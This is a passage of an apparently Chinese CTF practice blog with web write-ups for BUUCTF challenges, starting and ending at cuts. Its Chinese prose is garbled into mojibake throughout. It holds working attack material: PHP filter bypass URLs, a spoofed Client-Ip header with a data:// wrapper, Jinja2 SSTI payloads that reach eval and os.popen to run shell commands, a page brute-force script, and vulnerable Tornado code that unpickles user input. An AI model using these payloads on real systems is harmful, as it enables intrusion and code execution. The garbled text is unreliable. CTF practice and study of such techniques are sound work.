<p><code>$_SERVER['PHP_SELF']</code>‰ºöËé∑ÂèñÊàë‰ª¨ÂΩìÂâçÁöÑËÆøÈóÆË∑ØÂæÑ,Êàë‰ª¨ÊûÑÈÄ†index.php/config.php,Â∞±‰ºöËøîÂõûconfig.php</p>
<p>ÊúÄÂêéËÆøÈóÆsourceÂæóÂà∞flag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">index.php/config.php/%ff?source
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="mrctf2020Â•óÂ®É">[MRCTF2020]Â•óÂ®É
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;!--</span>
</span></span><span class="line"><span class="cl"><span class="c1">//1st
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$query</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> <span class="k">if</span><span class="p">(</span> <span class="nx">substr_count</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="s1">&#39;_&#39;</span><span class="p">)</span> <span class="o">!==</span> <span class="mi">0</span> <span class="o">||</span> <span class="nx">substr_count</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="s1">&#39;%5f&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Y0u are So cutE!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"> <span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;b_u_p_t&#39;</span><span class="p">]</span> <span class="o">!==</span> <span class="s1">&#39;23333&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^23333$/&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;b_u_p_t&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;you are going to the next ~&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="o">!--&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>$_SERVER['QUERY_STRING']</code>Ëøô‰∏™‰ºöÂåπÈÖç‰º†ÂÖ•ÁöÑ?‰πãÂêéÁöÑÂ≠óÁ¨¶</p>
<p><code>_</code>ÂèØ‰ª•Áî®Á©∫Ê†ºÊàñËÄÖ<code>.</code>ÁªïËøáÔºå/23333$/Ëøô‰∏™Âè™ÊúâÂ∞æÈÉ®ÊòØ23333Êâç‰ºöË¢´ÂåπÈÖçÂà∞</p>
<p>Áî®23333%0AÁªïËøá</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?b u p t=23333%0A
</span></span><span class="line"><span class="cl">ÊàñËÄÖ
</span></span><span class="line"><span class="cl">?b.u.p.t=23333%0A
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøõÂÖ•‰∏ã‰∏ÄÂ±ÇÔºåÊ≥®ÈáäÈáåÈù¢‰∏Ä‰∏≤jsfuck‰∏¢ÁªôÊéßÂà∂Âè∞</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250223153905373.png"
	width="1914"
	height="948"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250223153905373_hu11382517387856506685.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250223153905373_hu12513487781538241187.png 1024w"
	loading="lazy"
	
		alt="image-20250223153905373"
	
	
		class="gallery-image" 
		data-flex-grow="201"
		data-flex-basis="484px"
	
></p>
<p>post‰º†Merak,ËøõÂÖ•‰∏ã‰∏ÄÂ±Ç</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s1">&#39;takeip.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span><span class="s1">&#39;.&#39;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s1">&#39;flag.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;Merak&#39;</span><span class="p">])){</span> 
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">();</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">change</span><span class="p">(</span><span class="nv">$v</span><span class="p">){</span> 
</span></span><span class="line"><span class="cl">    <span class="nv">$v</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">    <span class="nv">$re</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span> 
</span></span><span class="line"><span class="cl">        <span class="nv">$re</span> <span class="o">.=</span> <span class="nx">chr</span> <span class="p">(</span> <span class="nx">ord</span> <span class="p">(</span><span class="nv">$v</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">+</span> <span class="nv">$i</span><span class="o">*</span><span class="mi">2</span> <span class="p">);</span> 
</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$re</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s1">&#39;Local access only!&#39;</span><span class="o">.</span><span class="s2">&#34;&lt;br/&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$ip</span> <span class="o">=</span> <span class="nx">getIp</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$ip</span><span class="o">!=</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;Sorry,you don&#39;t have permission!  Your ip is :&#34;</span><span class="o">.</span><span class="nv">$ip</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$ip</span> <span class="o">===</span> <span class="s1">&#39;127.0.0.1&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;2333&#39;</span><span class="p">])</span> <span class="o">===</span> <span class="s1">&#39;todat is a happy day&#39;</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;Your REQUEST is:&#34;</span><span class="o">.</span><span class="nx">change</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nx">change</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]));</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">  
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåipË¶ÅÊ±ÇÊòØ127.0.0.1</p>
<p>Ê∑ªÂä†<code>Client-Ip:127.0.0.1</code></p>
<p>2333ÂèÇÊï∞Áî®dataÂçèËÆÆÊàñËÄÖphp://input‰º†post‰πüË°å</p>
<p>ËÄåfileË¶ÅÂä†ÂØÜ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$v</span><span class="o">=</span><span class="s1">&#39;flag.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$re</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$re</span><span class="o">.=</span><span class="nx">chr</span> <span class="p">(</span> <span class="nx">ord</span> <span class="p">(</span><span class="nv">$v</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">-</span> <span class="nv">$i</span><span class="o">*</span><span class="mi">2</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$re</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250223154857700.png"
	width="771"
	height="147"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250223154857700_hu2327762203083936473.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250223154857700_hu8913719278668031190.png 1024w"
	loading="lazy"
	
		alt="image-20250223154857700"
	
	
		class="gallery-image" 
		data-flex-grow="524"
		data-flex-basis="1258px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?2333=data://text/plain,todat%20is%20a%20happy%20day&amp;file=ZmpdYSZmXGI=
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250223160749281.png"
	width="1860"
	height="734"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250223160749281_hu1763705911233221281.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250223160749281_hu2011737831780046975.png 1024w"
	loading="lazy"
	
		alt="image-20250223160749281"
	
	
		class="gallery-image" 
		data-flex-grow="253"
		data-flex-basis="608px"
	
></p>
<h2 id="cscctf-2019-qualflasklight">[CSCCTF 2019 Qual]FlaskLight
</h2><p>jinja2ÁöÑssti</p>
<p>Êü•ÊâæÂà∞warningsÁ±ªÂú®59</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250223161932486.png"
	width="1213"
	height="577"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250223161932486_hu3652242849461894680.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250223161932486_hu13968972118909050997.png 1024w"
	loading="lazy"
	
		alt="image-20250223161932486"
	
	
		class="gallery-image" 
		data-flex-grow="210"
		data-flex-basis="504px"
	
></p>
<p>‰ΩÜÊòØÂêéÈù¢Â∞±‰ºöÂõûÊòæ500Áä∂ÊÄÅÊÄÄÁñëËøáÊª§‰∫Üglobal</p>
<p>ÊãºÊé•ÁªïËøá</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).popen(&#34;ls&#34;).read()&#39;)
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).popen(&#34;cat flasklight/coomme_geeeett_youur_flek&#34;).read()&#39;)}}
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="watevrctf-2019cookie-store">[watevrCTF-2019]Cookie Store
</h2><p>‰º™ÈÄ†cookieÔºåbase64ÁºñÁ†ÅÂæóflag</p>
<h2 id="wustctf2020cv-maker">[WUSTCTF2020]CV Maker
</h2><p>Ê≥®ÂÜåÁôªÂÖ•ÔºåbpÊîπ‰∏∫ÂõæÁâáÊ†ºÂºè</p>
<p>‰∏ä‰º†ËöÅÂâëËøûÊé•</p>
<h2 id="ciscn2019-ÂçéÂåóËµõÂå∫-day1-web2ikun">[CISCN2019 ÂçéÂåóËµõÂå∫ Day1 Web2]ikun
</h2><p>‰∏äÊù•ÊèêÁ§∫ÁàÜÁ†¥ÁΩëÁ´ôÔºåË¶Å‰π∞Âà∞lv6,Êàë‰ª¨ÁÇπÂºÄlv4ÁöÑÂõûÊòæÂèÇÊï∞page,ÁàÜÁ†¥page</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s2">&#34;http://3ecc60d7-c14f-4805-9476-71bcd91747c8.node3.buuoj.cn/shop?page=&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">2000</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span> <span class="n">url</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;lv6.png&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁàÜÁ†¥Âá∫181</p>
<p>ÊäìÂåÖÊîπÊäòÊâ£</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250224195956481.png"
	width="1815"
	height="725"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250224195956481_hu18088761822422462305.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250224195956481_hu9922544820779111799.png 1024w"
	loading="lazy"
	
		alt="image-20250224195956481"
	
	
		class="gallery-image" 
		data-flex-grow="250"
		data-flex-basis="600px"
	
></p>
<p>ÂæóÂà∞/b1g_m4mberË∑ØÁî±,jwt‰º™ÈÄ†ÔºåkeyÊòØ1Kun</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250224200957244.png"
	width="991"
	height="61"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250224200957244_hu13541195208454464377.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250224200957244_hu11066851182009614471.png 1024w"
	loading="lazy"
	
		alt="image-20250224200957244"
	
	
		class="gallery-image" 
		data-flex-grow="1624"
		data-flex-basis="3899px"
	
></p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250224201145799.png"
	width="1445"
	height="635"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250224201145799_hu1422554894552198780.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250224201145799_hu12249293639242158175.png 1024w"
	loading="lazy"
	
		alt="image-20250224201145799"
	
	
		class="gallery-image" 
		data-flex-grow="227"
		data-flex-basis="546px"
	
></p>
<p>Êü•ÁúãÊ∫êÁ†ÅÂêéÈù¢ËÉΩ‰∏ãËΩΩÊ∫êÁ†Å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">tornado.web</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sshop.base</span> <span class="kn">import</span> <span class="n">BaseHandler</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">AdminHandler</span><span class="p">(</span><span class="n">BaseHandler</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nd">@tornado.web.authenticated</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">get</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">current_user</span> <span class="o">==</span> <span class="s2">&#34;admin&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">render</span><span class="p">(</span><span class="s1">&#39;form.html&#39;</span><span class="p">,</span> <span class="n">res</span><span class="o">=</span><span class="s1">&#39;This is Black Technology!&#39;</span><span class="p">,</span> <span class="n">member</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">render</span><span class="p">(</span><span class="s1">&#39;no_ass.html&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nd">@tornado.web.authenticated</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">post</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">become</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_argument</span><span class="p">(</span><span class="s1">&#39;become&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">p</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">urllib</span><span class="o">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">become</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">render</span><span class="p">(</span><span class="s1">&#39;form.html&#39;</span><span class="p">,</span> <span class="n">res</span><span class="o">=</span><span class="n">p</span><span class="p">,</span> <span class="n">member</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">render</span><span class="p">(</span><span class="s1">&#39;form.html&#39;</span><span class="p">,</span> <span class="n">res</span><span class="o">=</span><span class="s1">&#39;This is Black Technology!&#39;</span><span class="p">,</span> <span class="n">member</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">urllib</span><span class="o">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">become</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåpickleÊèê‰æõ‰∫Ü‰∏Ä‰∏™ÁÆÄÂçïÁöÑÊåÅ‰πÖÂåñÂäüËÉΩ„ÄÇÁî®Âà∞ÂèçÂ∫èÂàóÂåñ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">pickle</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="n">file</span><span class="p">,</span> <span class="p">[,</span><span class="n">protocol</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="err">ÂáΩÊï∞ÁöÑÂäüËÉΩÔºöÂ∞Ü</span><span class="n">objÂØπË±°Â∫èÂàóÂåñÂ≠òÂÖ•Â∑≤ÁªèÊâìÂºÄÁöÑfile‰∏≠</span><span class="err">„ÄÇ</span>
</span></span><span class="line"><span class="cl"><span class="err">ÂèÇÊï∞ËÆ≤Ëß£Ôºö</span>
</span></span><span class="line"><span class="cl"><span class="n">obj</span><span class="err">ÔºöÊÉ≥Ë¶ÅÂ∫èÂàóÂåñÁöÑ</span><span class="n">objÂØπË±°</span><span class="err">„ÄÇ</span>
</span></span><span class="line"><span class="cl"><span class="n">file</span><span class="p">:</span><span class="err">Êñá‰ª∂ÂêçÁß∞„ÄÇ</span>
</span></span><span class="line"><span class="cl"><span class="n">protocol</span><span class="err">ÔºöÂ∫èÂàóÂåñ‰ΩøÁî®ÁöÑÂçèËÆÆ„ÄÇÂ¶ÇÊûúËØ•È°πÁúÅÁï•ÔºåÂàôÈªòËÆ§‰∏∫</span><span class="mi">0</span><span class="err">„ÄÇÂ¶ÇÊûú‰∏∫Ë¥üÂÄºÊàñ</span><span class="n">HIGHEST_PROTOCOL</span><span class="err">ÔºåÂàô‰ΩøÁî®ÊúÄÈ´òÁöÑÂçèËÆÆÁâàÊú¨„ÄÇ</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pickle</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">file</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">ÂáΩÊï∞ÁöÑÂäüËÉΩÔºöÂ∞Ü</span><span class="n">file‰∏≠ÁöÑÂØπË±°Â∫èÂàóÂåñËØªÂá∫</span><span class="err">„ÄÇ</span>
</span></span><span class="line"><span class="cl"><span class="err">ÂèÇÊï∞ËÆ≤Ëß£Ôºö</span>
</span></span><span class="line"><span class="cl"><span class="n">file</span><span class="err">ÔºöÊñá‰ª∂ÂêçÁß∞„ÄÇ</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">obj</span><span class="p">[,</span> <span class="n">protocol</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="err">ÂáΩÊï∞ÁöÑÂäüËÉΩÔºöÂ∞Ü</span><span class="n">objÂØπË±°Â∫èÂàóÂåñ‰∏∫stringÂΩ¢Âºè</span><span class="err">ÔºåËÄå‰∏çÊòØÂ≠òÂÖ•Êñá‰ª∂‰∏≠„ÄÇ</span>
</span></span><span class="line"><span class="cl"><span class="err">ÂèÇÊï∞ËÆ≤Ëß£Ôºö</span>
</span></span><span class="line"><span class="cl"><span class="n">obj</span><span class="err">ÔºöÊÉ≥Ë¶ÅÂ∫èÂàóÂåñÁöÑ</span><span class="n">objÂØπË±°</span><span class="err">„ÄÇ</span>
</span></span><span class="line"><span class="cl"><span class="n">protocal</span><span class="err">ÔºöÂ¶ÇÊûúËØ•È°πÁúÅÁï•ÔºåÂàôÈªòËÆ§‰∏∫</span><span class="mi">0</span><span class="err">„ÄÇÂ¶ÇÊûú‰∏∫Ë¥üÂÄºÊàñ</span><span class="n">HIGHEST_PROTOCOL</span><span class="err">ÔºåÂàô‰ΩøÁî®ÊúÄÈ´òÁöÑÂçèËÆÆÁâàÊú¨„ÄÇ</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">string</span><span class="p">)</span>
